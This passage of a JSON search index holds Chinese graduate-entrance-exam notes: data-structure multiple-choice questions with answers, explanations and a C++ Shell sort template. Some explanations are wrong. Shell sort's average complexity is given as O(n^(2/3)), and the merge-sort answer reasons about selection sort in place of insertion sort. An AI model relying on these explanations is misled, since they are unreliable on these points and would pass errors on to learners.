\u8f6f\u4ef6\u3001\u8bbe\u5907\u65e0\u5173\u8f6f\u4ef6\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u3001\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f B\uff0e\u7528\u6237\u7ea7 I/O \u8f6f\u4ef6\u3001\u8bbe\u5907\u65e0\u5173\u8f6f\u4ef6\u3001\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f C\uff0e\u7528\u6237\u7ea7 I/O \u8f6f\u4ef6\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u3001\u8bbe\u5907\u65e0\u5173\u8f6f\u4ef6\u3001\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f D\uff0e\u7528\u6237\u7ea7 I/O \u8f6f\u4ef6\u3001\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3001\u8bbe\u5907\u65e0\u5173\u8f6f\u4ef6\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u8f93\u5165/\u8f93\u51fa\u8f6f\u4ef6\u4e00\u822c\u4ece\u4e0a\u5230\u4e0b\u5206\u4e3a\u56db\u4e2a\u5c42\u6b21\uff1a\u7528\u6237\u5c42\u3001\u4e0e\u8bbe\u5907\u65e0\u5173\u7684\u8f6f\u4ef6 \u5c42\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u4ee5\u53ca\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3002\u4e0e\u8bbe\u5907\u65e0\u5173\u7684\u8f6f\u4ef6\u5c42\u4e5f\u5c31\u662f\u7cfb\u7edf\u8c03\u7528\u7684\u5904\u7406\u7a0b\u5e8f","title":"2.2. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/","text":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 August # \u76ee\u5f55 # \u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 August \u76ee\u5f55 1. Week 1 1.1. Mon 1.2. Tue 1.3. Wed 1.4. Thu 1.5. Fri 2. Week 2 2.1. Sat 2.2. Sun 3. Week 3 3.1. Mon 3.2. Tue 3.3. Wed 3.4. Thu 4. Week 4 4.1. Tue 1. Week 1 # 1.1. Mon # \u82e5\u65e0\u5411\u56feG = \uff08V.E\uff09\u4e2d\u542b7\u4e2a\u9876\u70b9\uff0c\u5219\u4fdd\u8bc1\u56feG\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u662f\u8fde\u901a\u7684\uff0c\u5219\u9700\u8981\u7684\u8fb9\u6570\u6700\u5c11\u662f [\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66] A. 6 B. 15 C. 16 D. 21 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u82e5\u4fdd\u8bc1\u65e0\u5411\u56fe\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u662f\u8fde\u901a\u7684\uff0c\u5373\u4efb\u610f\u53d8\u52a8\u56feG\u4e2d\u7684\u8fb9\uff0c\u56feG\u59cb\u7ec8\u4fdd\u6301\u8fde\u901a\uff0c\u9996\u5148\u9700\u8981G\u7684\u4efb\u610f6\u4e2a\u7ed3\u70b9\u6784\u6210\u5b8c\u5168\u8054\u901a\u5b50\u56feG1\uff0c\u9700\u898115\u6761\u8fb9\uff0c\u7136\u540e\u5728\u6dfb\u52a0\u4e00\u6761\u8fb9\u4f7f\u7b2c7\u7ed3\u70b9\u4e0eG1\u8fde\u8d77\u6765\uff0c\u5171\u970016\u6761\u8fb9 1.2. Tue # \u5728\u4e00\u68f5\u5ea6\u4e3a4\u7684\u6811T\u4e2d\uff0c\u82e5\u670920\u4e2a\u5ea6\u4e3a4\u7684\u7ed3\u70b9\uff0c10\u4e2a\u5ea6\u4e3a3\u7684\u7ed3\u70b9\uff0c1\u4e2a\u5ea6\u4e3a2\u7684\u7ed3\u70b9\uff0c10\u4e2a\u5ea6\u4e3a1\u7684\u7ed3\u70b9\uff0c\u5219\u6811T\u7684\u53f6\u8282\u70b9\u4e2a\u6570\u662f [\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66] A. 41 B. 82 C. 113 D. 122 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u6811\u7684\u516c\u7406\uff1a\u70b9\u6570\u6bd4\u6bb5\u6570\u591a1\uff0cn -1 = 20*4 + 3*10 + 1*2 + 10*1 \uff0c\u6240\u4ee5n = 122 + 1 = 123 \uff0c\u5176\u4ed6\u8282\u70b9\u7684\u6570\u91cf\u603b\u548c\u4e3a m = 20 + 10 + 1 +10 = 41 \uff0c\u6240\u4ee5\uff0c\u53f6\u5b50\u8282\u70b9\u6570\u4e3an-m = 123 -41 = 82\u3002 1.3. Wed # \u7528\u4e24\u4e2a\u6808S1\u548cS2\u6a21\u62df\u4e00\u4e2a\u961f\u5217\u64cd\u4f5c\uff0c\u82e5\u5165\u961f\u5217\u7684\u64cd\u4f5c\u662f\u6808S1\u5165\u6808\uff0c\u5219\u51fa\u961f\u5217\u7684\u64cd\u4f5c\u662f [\u5317\u4eac\u4ea4\u901a\u5927\u5b66925-2018] A. \u6808S1\u51fa\u6808 B. \u6808S2\u51fa\u6808 C. \u82e5\u6808S1\u4e0d\u7a7a\uff0c\u6808S1\u51fa\u6808\uff1b\u5426\u5219\u6808S2\u51fa\u6808\u518d\u5165\u6808S1\u76f4\u5230\u6808S2\u7a7a\uff0c\u6808S1\u51fa\u6808 D. \u82e5\u6808S2\u4e0d\u7a7a\uff0c\u6808S2\u51fa\u6808\uff1b\u5426\u5219\u6808S1\u51fa\u6808\u518d\u5165\u6808S2\u76f4\u5230\u6808S1\u7a7a\uff0c\u6808S2\u51fa\u6808 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u5229\u7528\u4e24\u4e2a\u6808S1\u548cS2\u6765\u6a21\u62df\u4e00\u4e2a\u961f\u5217\uff0c\u5f53\u9700\u8981\u5411\u961f\u5217\u4e2d\u63d2\u5165\u4e00\u4e2a\u5143\u7d20\u65f6\uff0c\u7528S1\u6765\u5b58\u653e\u5df2\u7ecf\u8f93\u5165\u7684\u5143\u7d20\uff0c\u5373S1\u6267\u884c\u5165\u6808\u64cd\u4f5c\uff0c\u5f53\u9700\u8981\u51fa\u961f\u65f6\uff0c\u5219\u5bf9S2\u6267\u884c\u51fa\u6808\u64cd\u4f5c\u3002\u7531\u4e8e\u4ece\u6808\u4e2d\u53d6\u51fa\u5143\u7d20\u7684\u987a\u5e8f\u662f\u539f\u987a\u5e8f\u7684\u9006\u5e8f\uff0c\u6240\u4ee5\u5148\u5c06S1\u7684\u6240\u6709\u5143\u7d20\u5168\u90e8\u51fa\u6808\u5e76\u5165\u6808\u5230S2\u4e2d\uff0c\u518d\u5728S2\u4e2d\u8fdb\u884c\u51fa\u6808\u64cd\u4f5c\uff0c\u5c31\u80fd\u5b9e\u73b0\u51fa\u961f\u64cd\u4f5c\uff0c\u800c\u5728\u6267\u884c\u6b64\u64cd\u4f5c\u4e4b\u524d\uff0c\u5148\u5224\u65adS2\u662f\u5426\u4e3a\u7a7a\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4\u987a\u5e8f\u6df7\u4e71\u3002 1.4. Thu # \u6a21\u5f0f\u4e32T= 'abcaabbcabcaabdab' \uff0c T\u7684next\u6570\u7ec4\u503c\u53canextval\u6570\u7ec4\u503c\u4e3a [\u5317\u4eac\u4ea4\u901a\u5927\u5b66925] A.01112231123456712\u548c01100111011001702 B.01112121124567112\u548c01102131011021701 C.01112231123456712\u548c01102131011021701 D.01112121124567112\u548c01100111011001702 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a id 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 char a b c a a b b c a b c a a b d a b maxl 0 0 0 1 1 2 0 0 1 2 3 4 5 6 0 1 2 next 0 1 1 1 2 2 3 1 1 2 3 4 5 6 7 1 2 nextval 0 1 1 0 2 1 3 1 0 1 1 0 2 1 7 0 1 \u5982\u679c next[i] = next[next[i]]\uff0c\u5219 nextval[i] := next[next[i]]\uff0c\u5426\u5219 nextval[i] := next[i]\u3002 1.5. Fri # \u8bbe\u6709\u4e00\u7ec4\u5173\u952e\u5b57{25,46,73,9,14,92,45,31,20,51},\u7528\u94fe\u5730\u5740\u6cd5\u6784\u9020\u54c8\u5e0c\u8868\uff0c\u54c8\u5e0c\u51fd\u6570\u4e3aH(key)= key MOD 11\uff0c\u5219\u67e5\u627e\u4e0d\u6210\u529f\u65f6\u7684\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e3a [\u5317\u4eac\u4ea4\u901a\u5927\u5b66925-2017] A. 11/10 B. 12/11 C. 13/10 D. 10/11 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a10\u4e2a\u6570\u5b57mod 11 \u540e\u7ed3\u679c\u4e3a [3,2,7,9,3,4,1,9,9,7]\uff0c\u67e5\u627e\u5931\u8d25\u65f6 \u5730\u57400 \u6bd4\u8f830\u6b21 \u5730\u57401 \u6bd4\u8f831\u6b21 \u5730\u57402 \u6bd4\u8f831\u6b21 \u5730\u57403 \u6bd4\u8f832\u6b21 \u5730\u57404 \u6bd4\u8f831\u6b21 \u5730\u57405 \u6bd4\u8f830\u6b21 \u5730\u57406 \u6bd4\u8f830\u6b21 \u5730\u57407 \u6bd4\u8f832\u6b21 \u5730\u57408 \u6bd4\u8f830\u6b21 \u5730\u57409 \u6bd4\u8f833\u6b21 \u5730\u574010 \u6bd4\u8f830\u6b21ASL\u5931\u8d25=\uff081+0+1+2+1+0+0+2+0+3+0\uff09/11 =10/11\u3002 2. Week 2 # 2.1. Sat # 1.\u8bbe\u4e00\u6bb5\u6587\u672c\u4e2d\u5305\u542b\u5b57\u7b26{a, b, c, d, e}\uff0c\u5176\u51fa\u73b0\u6b21\u6570\u76f8\u5e94\u4e3a{3, 2, 5, 1, 1}\u3002\u5219\u7ecf\u8fc7\u54c8\u592b\u66fc\u7f16\u7801\u540e\uff0c\u6587\u672c\u6240\u5360\u603b\u4f4d\u6570\u4e3a [\u6d59\u6c5f\u5927\u5b66878-2017] A.12 B.25 C.26 D.36 \u7b54\u6848 \u7b54\u6848\uff1aB \u6839\u636e\u54c8\u592b\u66fc\u6811\uff0c5\u7f16\u7801\u4e3a1\uff0c3\u7f16\u7801\u4e3a11\uff0c2\u7f16\u7801\u4e3a110\uff0c\u4e24\u4e2a1\u7f16\u7801\u4e3a1110\u548c1111\uff0c\u6700\u540e\u7684\u603b\u4f4d\u6570\u4e3a\uff0c5*1 + 3*2 + 2*3 + 2* 4 = 25\u3002 2.2. Sun # \u82e5\u6709\u4e00\u4e8c\u53c9\u6811\u7684\u603b\u7ed3\u70b9\u6570\u4e3a98\uff0c\u53ea\u6709\u4e00\u4e2a\u513f\u5b50\u7684\u7ed3\u70b9\u6570\u4e3a48\uff0c\u5219\u8be5\u6811\u7684\u53f6\u7ed3\u70b9\u6570\u662f\u591a\u5c11\uff1f[\u6d59\u6c5f\u5927\u5b66878-2013] A. 25 B. 50 C. \u4e0d\u786e\u5b9a D. \u8fd9\u6837\u7684\u6811\u4e0d\u5b58\u5728 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u603b\u7ed3\u70b9\u4e2a\u6570\u4e3a n0 + n1 + n2\uff0c \u6211\u4eec\u53ef\u4ee5\u5f97\u523098 = n0 + n1 + n2 \u4e14n1 = 48\uff0c\u540c\u65f6n0 = n2 + 1 \u4e24\u4e2a\u5f0f\u5b50\u8054\u7acb\uff0c\u5f97\u5230n0 = 51/2 \u56e0\u4e3a\u7ed3\u70b9\u6570\u4e0d\u53ef\u80fd\u662f\u5c0f\u6570\uff0c\u6240\u4ee5\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u6811\u3002 3. Week 3 # 3.1. Mon # \u5177\u670911\u4e2a\u9876\u70b9\u7684\u8fde\u901a\u65e0\u5411\u56fe\uff0c\u8fb9\u7684\u603b\u6570\u6700\u591a\u4e3a \uff0c\u8fb9\u7684\u603b\u6570\u6700\u5c11\u4e3a [\u4e2d\u5357\u5927\u5b66943-2016-\u586b\u7a7a\u9898\u7b2c8\u9898\u6539\u7f16] A. 10\uff0c55 B. 55\uff0c10 C. 110\uff0c11 D. 11\uff0c110 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5bf9\u4e8e\u8fde\u901a\u65e0\u5411\u56fe\uff0c\u8fb9\u7684\u603b\u6570\u6700\u591a\u7684\u60c5\u51b5\u662f\u6b64\u56fe\u4e3a\u65e0\u5411\u5b8c\u5168\u56fe\u7684\u65f6\u5019\uff0c\u6b64\u65f6\u5bf9\u4e8en\u4e2a\u9876\u70b9\uff0c\u6709n*(n-1)/2\u6761\u8fb9\uff0c\u6b64\u9898n=11\uff0c\u4e8e\u662f\u8fb9\u6700\u591a\u4e3a11*\uff0811-1\uff09/2=55\u6761\u8fb9\u7684\u603b\u6570\u6700\u5c11\u7684\u60c5\u51b5\u662f\u6b64\u56fe\u4e3a\u6811\u7684\u60c5\u51b5\uff0c\u5bf9\u4e8e\u6811\u6765\u8bf4\uff0cn\u4e2a\u9876\u70b9\u6709n-1\u6761\u8fb9\uff0c\u4e8e\u662f\u6b64\u9898\u4e2d\u6700\u5c1110\u6761\u8fb9\u3002 3.2. Tue # \u5bf9\u5e7f\u4e49\u8868A=\uff08\uff08a,\uff08b\uff09\uff09\uff0c\uff08c\uff0c\uff08\uff09\uff09\uff0cd\uff09\u6267\u884c\u64cd\u4f5cgettail(gethead(gettail(A)))\u7684\u7ed3\u679c\u662f [\u5b81\u6ce2\u5927\u5b66916-2019] A. \uff08\uff09 B. \uff08\uff08\uff09\uff09 C. d D. \uff08d\uff09 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u8003\u5bdf\u5e7f\u4e49\u8868\u7684\u57fa\u672c\u64cd\u4f5c\u3002 Head\uff08\uff09\u51fd\u6570\uff1a\u53d6\u5e7f\u4e49\u8868\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 Tail\uff08\uff09\u51fd\u6570\uff1a\u53d6\u5e7f\u4e49\u8868\u4e2d\u9664\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5269\u4e0b\u7684\u5143\u7d20\u6784\u6210\u7684\u5e7f\u4e49\u8868 \u4e8e\u662f\u6211\u4eec\u5bf9A\u5148\u8fdb\u884c\u4e00\u6b21Tail\u64cd\u4f5c\u5f97\uff08\uff08c\uff0c\uff08\uff09\uff09\uff0cd\uff09 \u518d\u8fdb\u884c\u4e00\u6b21Head\u64cd\u4f5c\u5f97\uff08c\uff0c\uff08\uff09\uff09 \u6700\u540e\u8fdb\u884c\u4e00\u6b21Tail\u64cd\u4f5c\u5f97\uff08\uff08\uff09\uff09 3.3. Wed # \u5728\u5185\u90e8\u6392\u5e8f\u65f6\uff0c\u82e5\u9009\u62e9\u4e86\u5f52\u5e76\u6392\u5e8f\u800c\u6ca1\u6709\u9009\u62e9\u63d2\u5165\u6392\u5e8f\uff0c\u5219\u53ef\u80fd\u7684\u7406\u7531\u662f [\u54c8\u5c14\u6ee8\u5de5\u7a0b\u5927\u5b66] \u5f52\u5e76\u6392\u5e8f\u7684\u7a0b\u5e8f\u4ee3\u7801\u66f4\u77ed \u5f52\u5e76\u6392\u5e8f\u5360\u7528\u7684\u7a7a\u95f4\u66f4\u5c11 \u5f52\u5e76\u6392\u5e8f\u7684\u8fd0\u884c\u6548\u7387\u66f4\u9ad8 A. \u4ec52 B. \u4ec53 C. \u4ec51\u30012 D. \u4ec51\u30013 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u9009\u62e9\u6392\u5e8f\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u6700\u4f18\u6700\u574f\u548c\u5e73\u5747\u90fd\u4e3aO\uff08n2\uff09 \uff0c\u800c\u5f52\u5e76\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5219\u90fd\u4e3aO(nlog2n), \u53ef\u89c1\u5f52\u5e76\u7684\u6548\u7387\u9ad8\uff1b \u8d8a\u4f18\u7684\u7b97\u6cd5\u7684\u6b65\u9aa4\u5c31\u4e00\u822c\u4f1a\u8d8a\u590d\u6742\uff0c \u4f8b\u5982\u5192\u6ce1\u548c\u9009\u62e9\u4ee3\u7801\u90fd\u5f88\u7b80\u5355\uff0c \u6240\u4ee5\u5f52\u5e76\u6bd4\u9009\u62e9\u4ee3\u7801\u590d\u6742; \u5f52\u5e76\u662f\u5c5e\u4e8e\u7528\u7a7a\u95f4\u6362\u65f6\u95f4\u7684\u7b97\u6cd5\uff0c\u5728\u5806\u533anew\u51fa\u4e86\u7a7a\u95f4\uff0c\u800c\u9009\u62e9\u6392\u5e8f\u4e0d\u9700\u8981\u521b\u5efa\u7a7a\u95f4\uff0c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3aO(1)\u3002 3.4. Thu # \u5bf9\u5e8f\u5217{15\uff0c9\uff0c7\uff0c8\uff0c20\uff0c-1\uff0c4\uff0c} \u7528\u5e0c\u5c14\u6392\u5e8f\u65b9\u6cd5\u6392\u5e8f\uff0c\u7ecf\u4e00\u8d9f\u540e\u5e8f\u5217\u53d8\u4e3a{15\uff0c-1\uff0c4\uff0c8\uff0c20\uff0c9\uff0c7}\u5219\u8be5\u6b21\u91c7\u7528\u7684\u589e\u91cf\u662f [\u54c8\u5c14\u6ee8\u5de5\u7a0b\u5927\u5b66] A. 2 B. 1 C. 4 D. 3 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a9\u548c-1\u66ff\u6362\uff0c7\u548c4\u66ff\u6362\uff0c\u589e\u91cf\u4e3a4\u3002 \u5e0c\u5c14\u6392\u5e8f(Shell's Sort)\u662f\u63d2\u5165\u6392\u5e8f\u7684\u4e00\u79cd\u53c8\u79f0\u201c\u7f29\u5c0f\u589e\u91cf\u6392\u5e8f\u201d\uff08Diminishing Increment Sort\uff09\uff0c\u662f\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u7b97\u6cd5\u7684\u4e00\u79cd\u66f4\u9ad8\u6548\u7684\u6539\u8fdb\u7248\u672c\u3002\u5e0c\u5c14\u6392\u5e8f\u662f\u975e\u7a33\u5b9a\u6392\u5e8f\u7b97\u6cd5\u3002\u8be5\u65b9\u6cd5\u56e0 D.L.Shell \u4e8e 1959 \u5e74\u63d0\u51fa\u800c\u5f97\u540d\u3002 \u5e0c\u5c14\u6392\u5e8f\u662f\u628a\u8bb0\u5f55\u6309\u4e0b\u6807\u7684\u4e00\u5b9a\u589e\u91cf\u5206\u7ec4\uff0c\u5bf9\u6bcf\u7ec4\u4f7f\u7528\u76f4\u63a5\u63d2\u5165\u6392\u5e8f\u7b97\u6cd5\u6392\u5e8f\uff1b\u968f\u7740\u589e\u91cf\u9010\u6e10\u51cf\u5c11\uff0c\u6bcf\u7ec4\u5305\u542b\u7684\u5173\u952e\u8bcd\u8d8a\u6765\u8d8a\u591a\uff0c\u5f53\u589e\u91cf\u51cf\u81f3 1 \u65f6\uff0c\u6574\u4e2a\u6587\u4ef6\u6070\u88ab\u5206\u6210\u4e00\u7ec4\uff0c\u7b97\u6cd5\u4fbf\u7ec8\u6b62\u3002 \u589e\u91cf\u4e00\u822c\u521d\u59cb\u5316\u4e3a\u5e8f\u5217\u957f\u5ea6 D \u7684 1 / 2 \uff0c\u5373 n := D / 2 \u3002\u7136\u540e\u6bd4\u8f83 list[i] \u548c list[i + n] \u7684\u5927\u5c0f\uff0c\u82e5\u4e3a\u5347\u5e8f\u6392\u5e8f\uff0c\u4e14 list[i] < list[i + n] \uff0c\u5219\u4ea4\u6362\u4f4d\u7f6e\u3002\u6bcf\u904d\u5386\u5b8c\u4e00\u8f6e\u4ee5\u540e n := n / 2 \uff0c\u5f53 n = 0 \u65f6\u6392\u5e8f\u7ed3\u675f\u3002 \u7b97\u6cd5\u5e73\u5747\u590d\u6742\u5ea6\u4e3a O(n ^ {\\frac{2}{3}}) \u3002 template <typename _RIter> void insert_sort(_RIter st, _RIter ed, int delta) { for(_RIter i = st + delta; i < ed; i += delta) { for(_RIter j = i; j > st; j -= delta) if(*j < *(j - delta)) std::swap(*j, *(j - delta)); else break; } } template <typename _RIter> void shell_sort(_RIter st, _RIter ed) { for(int delta = ed - st; delta; delta /= 2) for(int i = 0; i < delta; i++) insert_sort(st + i, ed, delta); } 4. Week 4 # 4.1. Tue # \u56feG\u662fn\u4e2a\u9876\u70b9\u7684\u65e0\u5411\u5b8c\u5168\u56fe,\u5219\u4e0b\u5217\u8bf4\u6cd5\u4e0d\u6b63\u786e\u7684\u4e3a: [\u4e2d\u56fd\u79d1\u5b66\u9662\u5927\u5b66-2018] A. G\u7684\u90bb\u63a5\u591a\u91cd\u8868\u9700\u8981n(n-1)\u4e2a\u8fb9\u7ed3\u70b9\u548cn\u4e2a\u9876\u70b9\u7ed3\u70b9 B. G\u7684\u8fde\u901a\u5206\u91cf\u4e2a\u6570\u6700\u5c11 C. G\u4e3a\u8fde\u901a\u56fe D. G\u6240\u6709\u9876\u70b9\u7684\u5ea6\u7684\u603b\u548c\u4e3an(n-1) \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u5728\u65e0\u5411\u56fe\u4e2d\uff0c\u5982\u679c\u4ece\u9876\u70b9vi\u5230\u9876\u70b9vj\u6709\u8def\u5f84\uff0c\u5219\u79f0vi\u548cvj\u8fde\u901a\u3002\u5982\u679c\u56fe\u4e2d\u4efb\u610f\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u90fd\u8fde\u901a\uff0c\u5219\u79f0\u8be5\u56fe\u4e3a\u8fde\u901a\u56fe\uff0c\u5426\u5219\uff0c\u79f0\u8be5\u56fe\u4e3a\u975e\u8fde\u901a\u56fe\uff0c\u5219\u5176\u4e2d\u7684\u6781\u5927\u8fde\u901a\u5b50\u56fe\u79f0\u4e3a\u8fde\u901a\u5206\u91cf\uff0c\u8fd9\u91cc\u6240\u8c13\u7684\u6781\u5927\u662f\u6307\u5b50\u56fe\u4e2d\u5305\u542b\u7684\u9876\u70b9\u4e2a\u6570\u6781\u5927\u3002 A. \u8fb9\u7684\u6761\u6570\u4e3aC\uff08n,2\uff09=n(n-1)/2\u3002\u4e0e\u5341\u5b57\u94fe\u8868\u7c7b\u4f3c\uff0c\u5728\u4e34\u8857\u591a\u91cd\u8868\u4e2d\uff0c\u6bcf\u6761\u8fb9\u7528\u4e00\u4e2a\u7ed3\u70b9\u8868\u793a\u3002 B. G\u662f\u5b8c\u5168\u56fe\uff0c\u5fc5\u5b9a\u662f\u8fde\u901a\u56fe\u3002\u6240\u4ee5\u8fde\u901a\u5206\u91cf\u53ea\u6709\u5176\u81ea\u8eab C. G\u662f\u5b8c\u5168\u56fe\uff0c\u5fc5\u5b9a\u662f\u8fde\u901a\u56fe D. \u6bcf\u4e2a\u9876\u70b9\u90fd\u4e0e\u5176\u4f59n-1\u4e2a\u9876\u70b9\u76f8\u8fde\uff0c\u5219n\u4e2a\u9876\u70b9\u5ea6\u7684\u548c\u4e3an(n-1)","title":"2020 August"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#2020-august","text":"","title":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 August"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#_1","text":"\u6570\u636e\u7ed3\u6784\u6bcf\u65e5\u4e00\u9898 2020 August \u76ee\u5f55 1. Week 1 1.1. Mon 1.2. Tue 1.3. Wed 1.4. Thu 1.5. Fri 2. Week 2 2.1. Sat 2.2. Sun 3. Week 3 3.1. Mon 3.2. Tue 3.3. Wed 3.4. Thu 4. Week 4 4.1. Tue","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#1-week-1","text":"","title":"1. Week 1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#11-mon","text":"\u82e5\u65e0\u5411\u56feG = \uff08V.E\uff09\u4e2d\u542b7\u4e2a\u9876\u70b9\uff0c\u5219\u4fdd\u8bc1\u56feG\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u662f\u8fde\u901a\u7684\uff0c\u5219\u9700\u8981\u7684\u8fb9\u6570\u6700\u5c11\u662f [\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66] A. 6 B. 15 C. 16 D. 21 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u82e5\u4fdd\u8bc1\u65e0\u5411\u56fe\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u662f\u8fde\u901a\u7684\uff0c\u5373\u4efb\u610f\u53d8\u52a8\u56feG\u4e2d\u7684\u8fb9\uff0c\u56feG\u59cb\u7ec8\u4fdd\u6301\u8fde\u901a\uff0c\u9996\u5148\u9700\u8981G\u7684\u4efb\u610f6\u4e2a\u7ed3\u70b9\u6784\u6210\u5b8c\u5168\u8054\u901a\u5b50\u56feG1\uff0c\u9700\u898115\u6761\u8fb9\uff0c\u7136\u540e\u5728\u6dfb\u52a0\u4e00\u6761\u8fb9\u4f7f\u7b2c7\u7ed3\u70b9\u4e0eG1\u8fde\u8d77\u6765\uff0c\u5171\u970016\u6761\u8fb9","title":"1.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#12-tue","text":"\u5728\u4e00\u68f5\u5ea6\u4e3a4\u7684\u6811T\u4e2d\uff0c\u82e5\u670920\u4e2a\u5ea6\u4e3a4\u7684\u7ed3\u70b9\uff0c10\u4e2a\u5ea6\u4e3a3\u7684\u7ed3\u70b9\uff0c1\u4e2a\u5ea6\u4e3a2\u7684\u7ed3\u70b9\uff0c10\u4e2a\u5ea6\u4e3a1\u7684\u7ed3\u70b9\uff0c\u5219\u6811T\u7684\u53f6\u8282\u70b9\u4e2a\u6570\u662f [\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66] A. 41 B. 82 C. 113 D. 122 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u6811\u7684\u516c\u7406\uff1a\u70b9\u6570\u6bd4\u6bb5\u6570\u591a1\uff0cn -1 = 20*4 + 3*10 + 1*2 + 10*1 \uff0c\u6240\u4ee5n = 122 + 1 = 123 \uff0c\u5176\u4ed6\u8282\u70b9\u7684\u6570\u91cf\u603b\u548c\u4e3a m = 20 + 10 + 1 +10 = 41 \uff0c\u6240\u4ee5\uff0c\u53f6\u5b50\u8282\u70b9\u6570\u4e3an-m = 123 -41 = 82\u3002","title":"1.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#13-wed","text":"\u7528\u4e24\u4e2a\u6808S1\u548cS2\u6a21\u62df\u4e00\u4e2a\u961f\u5217\u64cd\u4f5c\uff0c\u82e5\u5165\u961f\u5217\u7684\u64cd\u4f5c\u662f\u6808S1\u5165\u6808\uff0c\u5219\u51fa\u961f\u5217\u7684\u64cd\u4f5c\u662f [\u5317\u4eac\u4ea4\u901a\u5927\u5b66925-2018] A. \u6808S1\u51fa\u6808 B. \u6808S2\u51fa\u6808 C. \u82e5\u6808S1\u4e0d\u7a7a\uff0c\u6808S1\u51fa\u6808\uff1b\u5426\u5219\u6808S2\u51fa\u6808\u518d\u5165\u6808S1\u76f4\u5230\u6808S2\u7a7a\uff0c\u6808S1\u51fa\u6808 D. \u82e5\u6808S2\u4e0d\u7a7a\uff0c\u6808S2\u51fa\u6808\uff1b\u5426\u5219\u6808S1\u51fa\u6808\u518d\u5165\u6808S2\u76f4\u5230\u6808S1\u7a7a\uff0c\u6808S2\u51fa\u6808 \u7b54\u6848 \u7b54\u6848\uff1aD 